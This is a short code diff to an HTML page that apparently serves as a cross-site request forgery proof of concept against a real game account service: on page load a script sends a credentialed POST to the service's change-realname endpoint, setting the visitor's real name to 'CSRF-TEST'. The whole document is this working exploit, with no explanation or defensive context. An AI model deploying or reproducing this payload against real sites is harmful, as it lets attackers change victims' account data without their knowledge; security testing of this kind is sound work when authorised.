@@ -4,18 +4,12 @@
 <script>
 fetch("https://account.arena.net/modals/change-realname.json", {
     method: "POST",
-    mode: "no-cors",
     credentials: "include",
     headers: {
         "Content-Type": "text/plain"
     },
-    body: JSON.stringify({
-        _formName: "change-realname",
-        realname: "tirirororoooororororo"
-    })
-});
+    body: '{"_formName":"change-realname","realname":"CSRF-TEST"}'
+}).catch(console.error);
 </script>
-
-<h3>CSRF test sent</h3>
 </body>
 </html>
